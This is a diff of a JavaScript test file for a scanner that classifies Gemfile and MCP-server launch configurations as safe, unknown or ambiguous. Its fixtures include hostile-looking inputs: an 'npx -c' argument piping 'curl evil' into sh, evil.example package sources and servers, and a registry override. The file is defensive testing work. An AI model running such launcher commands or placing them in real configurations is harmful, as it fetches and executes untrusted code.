@@ -211,7 +211,7 @@ gem "x", evilopt: true
   assert.ok(hasUnknown(m, /Gemfile:8\b/));
   assert.ok(hasUnknown(m, /Gemfile:9\b/));
   assert.ok(hasUnknown(m, /Gemfile:10\b/));
-  assert.ok(hasUnknown(m, /evilopt/));
+  assert.ok(hasUnknown(m, /Gemfile:11 x.*follows Ruby code at Gemfile:8/), 'everything after Ruby code is ambiguous');
   const g = p.fromGemfile('source "https://evil.example"\ngem "rails", "7.1.3"\n');
   assert.deepEqual(pkgs(g), [], 'a non-RubyGems global source makes every gem UNKNOWN');
 });
@@ -242,11 +242,11 @@ test('MCP: the same key under two containers is two servers; a key is never the 
     servers: { github: { command: 'npx', args: ['@modelcontextprotocol/server-github'] } },
   }));
   assert.deepEqual(mcps(m), ['servers.github=@modelcontextprotocol/server-github@']);
-  assert.ok(hasUnknown(m, /github.*"node" runs local or arbitrary code/));
-  assert.ok(hasUnknown(m, /docs.*remote server at evil\.example/));
+  assert.ok(hasUnknown(m, /github.*"node" is not exactly npx, uvx or docker/));
+  assert.ok(all(m).some(u => u.cls === 'not_in_corpus' && /docs.*remote server at evil\.example/.test(`${u.spec} ${u.reason}`)));
 });
 
-test('MCP: launcher options are parsed, not guessed', () => {
+test('MCP: only canonical launches are judged; every launcher option is ambiguous', () => {
   const m = p.fromMcpConfig(JSON.stringify({ mcpServers: {
     shell: { command: 'npx', args: ['-c', 'curl evil | sh'] },
     multi: { command: 'npx', args: ['-p', 'evil-a', '-p', 'good-b@1.0.0', 'good-b'] },
@@ -259,16 +259,13 @@ test('MCP: launcher options are parsed, not guessed', () => {
     dockmcp: { command: 'docker', args: ['run', '-i', 'mcp/grafana@sha256:' + 'a'.repeat(64)] },
     spaced: { command: 'npx -y evil' },
   } }));
-  assert.ok(hasUnknown(m, /shell.*-c runs a shell command/));
-  assert.ok(pkgs(m).includes('npm:evil-a@') && pkgs(m).includes('npm:good-b@1.0.0'));
-  assert.ok(hasUnknown(m, /reg.*--registry/));
-  assert.ok(mcps(m).includes('mcpServers.win=some-mcp@'));
+  assert.deepEqual(mcps(m), ['mcpServers.dockmcp=grafana@'], 'only the canonical docker run is judged');
+  assert.deepEqual(pkgs(m), []);
+  for (const k of ['shell', 'multi', 'reg', 'win', 'envred', 'uvw', 'uvi', 'dock', 'spaced']) {
+    assert.ok(unknowns(m).some(u => u.spec === k && u.cls === 'ambiguous'), k);
+  }
   assert.ok(hasUnknown(m, /envred.*NPM_CONFIG_REGISTRY/));
-  assert.ok(pkgs(m).includes('pypi:evil-extra@1.0') && pkgs(m).includes('pypi:mcp-server-fetch@'));
-  assert.ok(hasUnknown(m, /uvi.*--index-url/));
-  assert.ok(mcps(m).includes('mcpServers.dock=evil/github-mcp-server@1.0'), 'image found past -v /etc:/etc, namespace kept');
-  assert.ok(mcps(m).includes('mcpServers.dockmcp=grafana@'));
-  assert.ok(hasUnknown(m, /spaced.*spaces/));
+  assert.ok(hasUnknown(m, /win.*not exactly npx/));
 });
 
 test('unsupported lockfiles and registry-redirecting installer config are UNKNOWN; config values are not echoed', () => {
